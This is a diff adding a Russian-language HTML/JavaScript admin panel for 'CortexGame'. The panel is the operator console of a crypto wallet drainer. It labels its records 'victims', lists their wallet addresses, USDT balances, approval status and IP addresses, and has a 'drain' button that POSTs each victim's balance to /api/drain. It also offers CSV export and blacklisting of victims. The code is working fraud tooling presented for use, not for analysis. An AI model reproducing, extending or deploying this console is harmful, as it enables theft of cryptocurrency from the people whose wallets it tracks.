@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Админ-панель | CortexGame</title>
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a1a;
+            color: #fff;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1500px;
+            margin: 0 auto;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 30px;
+            padding: 24px 32px;
+            background: linear-gradient(135deg, #1a1a3e, #0a0a2a);
+            border-radius: 16px;
+            border: 1px solid rgba(0, 232, 255, 0.15);
+        }
+
+        .header h1 {
+            font-size: 28px;
+            background: linear-gradient(90deg, #00e8ff, #c84dff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+        }
+
+        .header .sub {
+            font-size: 14px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        /* ===== СТАТИСТИКА ===== */
+        .stats {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        .stat-item .number {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffd700;
+        }
+
+        .stat-item .number.green {
+            color: #4ade80;
+        }
+        .stat-item .number.blue {
+            color: #60a5fa;
+        }
+        .stat-item .number.red {
+            color: #ef4444;
+        }
+        .stat-item .number.pink {
+            color: #c84dff;
+        }
+
+        .stat-item .label {
+            color: #888;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== КНОПКИ ===== */
+        .controls {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+            padding: 16px 20px;
+            background: #111128;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            align-items: center;
+        }
+
+        .controls button {
+            padding: 10px 22px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+
+        .btn-refresh {
+            background: #2a2a5a;
+            color: #fff;
+        }
+        .btn-refresh:hover {
+            background: #3a3a7a;
+        }
+
+        .btn-export {
+            background: #1a5a2a;
+            color: #fff;
+        }
+        .btn-export:hover {
+            background: #2a7a3a;
+        }
+
+        .btn-clear {
+            background: #5a1a1a;
+            color: #fff;
+        }
+        .btn-clear:hover {
+            background: #7a2a2a;
+        }
+
+        .online-status {
+            color: #666;
+            font-size: 13px;
+            margin-left: auto;
+        }
+
+        .online-status .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #22c55e;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        .total-usdt {
+            font-size: 14px;
+            color: #ffd700;
+            margin-left: 20px;
+        }
+        .total-usdt span {
+            font-weight: 700;
+            color: #4ade80;
+        }
+
+        /* ===== ТАБЛИЦА ===== */
+        .table-wrap {
+            background: #111128;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .table-scroll {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            min-width: 1000px;
+        }
+
+        thead {
+            background: #1a1a3e;
+            border-bottom: 2px solid #2a2a5a;
+        }
+
+        th {
+            padding: 14px 16px;
+            text-align: left;
+            font-weight: 600;
+            color: #00e8ff;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+
+        td {
+            padding: 12px 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: #ccc;
+            vertical-align: middle;
+        }
+
+        tr:hover {
+            background: rgba(0, 232, 255, 0.03);
+        }
+
+        /* ===== БЭЙДЖИ СТАТУСОВ ===== */
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .status-active {
+            background: #1a5a2a;
+            color: #4ade80;
+        }
+
+        .status-approved {
+            background: #2a2a5a;
+            color: #60a5fa;
+        }
+
+        .status-processed {
+            background: #1a2a5a;
+            color: #a78bfa;
+        }
+
+        .status-blacklisted {
+            background: #5a1a1a;
+            color: #ef4444;
+        }
+
+        /* ===== АДРЕС ===== */
+        .address-cell {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #ffd700;
+        }
+
+        /* ===== БАЛАНС ===== */
+        .balance-cell {
+            font-weight: 700;
+            color: #4ade80;
+            font-size: 14px;
+        }
+
+        .balance-cell.zero {
+            color: #666;
+        }
+
+        /* ===== ДЕЙСТВИЯ ===== */
+        .actions {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .actions select {
+            padding: 4px 8px;
+            border-radius: 6px;
+            background: #1a1a3e;
+            color: #fff;
+            border: 1px solid #2a2a5a;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .actions select:hover {
+            border-color: #00e8ff;
+        }
+
+        .copy-btn {
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            padding: 2px 6px;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .copy-btn:hover {
+            color: #ffd700;
+        }
+
+        /* ===== КНОПКА СПИСАНИЯ ===== */
+        .drain-btn {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            border: none;
+            color: #fff;
+            padding: 4px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 11px;
+            transition: all 0.2s;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .drain-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.5);
+        }
+
+        .drain-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .drain-btn.drained {
+            background: #1a5a2a;
+            cursor: default;
+        }
+        .drain-btn.drained:hover {
+            transform: none;
+            box-shadow: none;
+        }
+
+        .delete-btn {
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            padding: 4px 8px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .delete-btn:hover {
+            color: #ef4444;
+            transform: scale(1.2);
+        }
+
+        /* ===== ПУСТО ===== */
+        .empty {
+            text-align: center;
+            padding: 60px;
+            color: #666;
+        }
+
+        .empty .emoji {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 12px 24px;
+            background: #1a1a3e;
+            border: 1px solid #ffd700;
+            border-radius: 12px;
+            color: #ffd700;
+            font-size: 14px;
+            transform: translateY(120px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 999;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success {
+            border-color: #4ade80;
+            color: #4ade80;
+        }
+
+        .toast.error {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+
+        /* ===== АДАПТИВ ===== */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+            }
+            .stats {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            .controls {
+                justify-content: center;
+            }
+            .total-usdt {
+                margin-left: 0;
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <div class="header">
+            <div>
+                <h1>👑 Админ-панель</h1>
+                <div class="sub">Управление жертвами | CortexGame</div>
+            </div>
+            <div class="stats" id="stats">
+                <div class="stat-item">
+                    <div class="number" id="totalCount">0</div>
+                    <div class="label">Всего жертв</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number green" id="activeCount">0</div>
+                    <div class="label">Активных</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number blue" id="approvedCount">0</div>
+                    <div class="label">APPROVED</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number pink" id="processedCount">0</div>
+                    <div class="label">Списано</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== КНОПКИ ===== -->
+        <div class="controls">
+            <button class="btn-refresh" onclick="loadData()">🔄 Обновить</button>
+            <button class="btn-export" onclick="exportCSV()">📥 Экспорт CSV</button>
+            <button class="btn-clear" onclick="clearAll()">🗑️ Очистить всех</button>
+            <span class="online-status"><span class="dot"></span>Онлайн</span>
+            <span class="total-usdt">💰 Всего USDT: <span id="totalUsdtDisplay">0.00</span></span>
+        </div>
+
+        <!-- ===== ТАБЛИЦА ===== -->
+        <div class="table-wrap">
+            <div class="table-scroll">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Адрес</th>
+                            <th>Кошелёк</th>
+                            <th>💰 Баланс</th>
+                            <th>Статус</th>
+                            <th>Tx Hash</th>
+                            <th>IP</th>
+                            <th>Дата</th>
+                            <th>Действия</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                        <tr>
+                            <td colspan="9" class="empty">
+                                <div class="emoji">🔄</div>
+                                Загрузка...
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ========================================
+        // 🚀 АДМИНКА — ПОЛНАЯ ЛОГИКА
+        // ========================================
+
+        let victims = [];
+
+        // ========== ЗАГРУЗКА ==========
+        async function loadData() {
+            try {
+                // Жертвы
+                const res = await fetch('/api/victims');
+                const data = await res.json();
+                if (data.success) {
+                    victims = data.data;
+                    await fetchBalances(victims);
+                    renderTable(victims);
+                }
+
+                // Статистика
+                const statsRes = await fetch('/api/stats');
+                const statsData = await statsRes.json();
+                if (statsData.success) {
+                    const s = statsData.data;
+                    document.getElementById('totalCount').textContent = s.total || 0;
+                    document.getElementById('activeCount').textContent = s.active || 0;
+                    document.getElementById('approvedCount').textContent = s.approved || 0;
+                    document.getElementById('processedCount').textContent = s.processed || 0;
+                }
+
+                updateTotalBalance();
+
+            } catch (e) {
+                console.error('Load error:', e);
+                showToast('❌ Ошибка загрузки', 'error');
+            }
+        }
+
+        // ========== БАЛАНСЫ ==========
+        async function fetchBalances(list) {
+            if (!list || list.length === 0) return;
+            const addresses = list.map(v => v.address);
+            try {
+                const res = await fetch('/api/balances', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ addresses })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    list.forEach(v => {
+                        v.balance = data.balances[v.address] || 0;
+                    });
+                }
+            } catch (e) {
+                list.forEach(v => { v.balance = 0; });
+            }
+        }
+
+        // ========== ОБЩИЙ БАЛАНС ==========
+        function updateTotalBalance() {
+            let total = 0;
+            victims.forEach(v => {
+                if (v.balance && v.status !== 'blacklisted') {
+                    total += parseFloat(v.balance);
+                }
+            });
+            document.getElementById('totalUsdtDisplay').textContent = total.toFixed(2);
+        }
+
+        // ========== РЕНДЕР ==========
+        function renderTable(data) {
+            const tbody = document.getElementById('tableBody');
+
+            if (!data || data.length === 0) {
+                tbody.innerHTML =
+                    `<tr><td colspan="9" class="empty"><div class="emoji">📭</div>Нет жертв</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = data.map((v, i) => {
+                const balance = v.balance || 0;
+                const balClass = balance > 0 ? 'balance-cell' : 'balance-cell zero';
+                const isDrained = v.status === 'processed' || v.status === 'blacklisted';
+                const statusClass = `status-${v.status || 'active'}`;
+
+                return `
+                <tr>
+                    <td>${i + 1}</td>
+                    <td class="address-cell">
+                        ${v.address.slice(0, 8)}...${v.address.slice(-6)}
+                        <button class="copy-btn" onclick="copyAddress('${v.address}')">📋</button>
+                    </td>
+                    <td>${v.wallet_type || 'unknown'}</td>
+                    <td class="${balClass}">${balance.toFixed(2)} USDT</td>
+                    <td><span class="status-badge ${statusClass}">${v.status || 'active'}</span></td>
+                    <td style="font-size:11px; color:#666;">${v.tx_hash ? v.tx_hash.slice(0, 10) + '...' : '-'}</td>
+                    <td style="font-size:11px; color:#666;">${v.ip || '-'}</td>
+                    <td style="font-size:11px; color:#666;">${v.created_at ? new Date(v.created_at).toLocaleString() : '-'}</td>
+                    <td class="actions">
+                        <select onchange="updateStatus('${v.address}', this.value)">
+                            <option value="active" ${v.status === 'active' ? 'selected' : ''}>Активен</option>
+                            <option value="approved" ${v.status === 'approved' ? 'selected' : ''}>Approved</option>
+                            <option value="processed" ${v.status === 'processed' ? 'selected' : ''}>Списано</option>
+                            <option value="blacklisted" ${v.status === 'blacklisted' ? 'selected' : ''}>Черный список</option>
+                        </select>
+                        <button class="drain-btn ${isDrained ? 'drained' : ''}" 
+                                onclick="drainWallet('${v.address}')" 
+                                ${isDrained ? 'disabled' : ''}>
+                            ${isDrained ? '✅ Снято' : '💰 Снять'}
+                        </button>
+                        <button class="delete-btn" onclick="deleteVictim('${v.address}')">✕</button>
+                    </td>
+                </tr>
+            `}).join('');
+        }
+
+        // ========== КОПИРОВАТЬ ==========
+        function copyAddress(address) {
+            navigator.clipboard.writeText(address);
+            showToast('✅ Адрес скопирован', 'success');
+        }
+
+        // ========== СТАТУС ==========
+        async function updateStatus(address, status) {
+            try {
+                await fetch(`/api/victim/${address}/status`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ status, notes: `Обновлён: ${new Date().toISOString()}` })
+                });
+                showToast(`✅ Статус: ${status}`, 'success');
+                loadData();
+            } catch (e) {
+                showToast('❌ Ошибка', 'error');
+            }
+        }
+
+        // ========== УДАЛИТЬ ==========
+        async function deleteVictim(address) {
+            try {
+                await fetch(`/api/victim/${address}`, { method: 'DELETE' });
+                showToast('🗑️ Удалено', 'success');
+                loadData();
+            } catch (e) {
+                showToast('❌ Ошибка удаления', 'error');
+            }
+        }
+
+        // ========== СПИСАТЬ ==========
+        async function drainWallet(address) {
+            try {
+                const victim = victims.find(v => v.address === address);
+                if (!victim) {
+                    showToast('❌ Жертва не найдена', 'error');
+                    return;
+                }
+
+                if (victim.status === 'processed' || victim.status === 'blacklisted') {
+                    showToast('⚠️ Уже обработано', 'error');
+                    return;
+                }
+
+                const balance = victim.balance || 0;
+                if (balance <= 0) {
+                    showToast('⚠️ Нет USDT', 'error');
+                    return;
+                }
+
+                const res = await fetch('/api/drain', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address, amount: balance })
+                });
+
+                const result = await res.json();
+
+                if (result.success) {
+                    showToast(`✅ Снято ${balance.toFixed(2)} USDT`, 'success');
+                    loadData();
+                } else {
+                    showToast(`❌ ${result.error || 'Ошибка'}`, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Ошибка списания', 'error');
+            }
+        }
+
+        // ========== ЭКСПОРТ ==========
+        function exportCSV() {
+            window.open('/api/export', '_blank');
+            showToast('📥 Экспорт запущен', 'success');
+        }
+
+        // ========== ОЧИСТКА ==========
+        async function clearAll() {
+            try {
+                await fetch('/api/clear', { method: 'DELETE' });
+                showToast('🗑️ Все удалены', 'success');
+                loadData();
+            } catch (e) {
+                showToast('❌ Ошибка очистки', 'error');
+            }
+        }
+
+        // ========== TOAST ==========
+        function showToast(msg, type = '') {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.className = 'toast ' + type;
+            toast.classList.add('show');
+            clearTimeout(toast.timeout);
+            toast.timeout = setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ========== АВТО-ОБНОВЛЕНИЕ ==========
+        loadData();
+        setInterval(loadData, 15000);
+    </script>
+
+</body>
+</html>
